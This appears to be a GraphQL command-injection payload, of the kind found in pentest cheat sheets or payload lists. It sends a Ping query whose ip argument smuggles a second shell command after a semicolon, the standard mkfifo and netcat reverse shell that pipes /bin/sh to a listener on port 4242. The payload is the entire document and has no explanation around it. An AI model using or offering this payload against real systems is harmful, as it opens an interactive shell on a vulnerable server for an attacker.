```
{
  Ping(ip: "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip 4242 >/tmp/f") {
    ip
    output
  }
}
```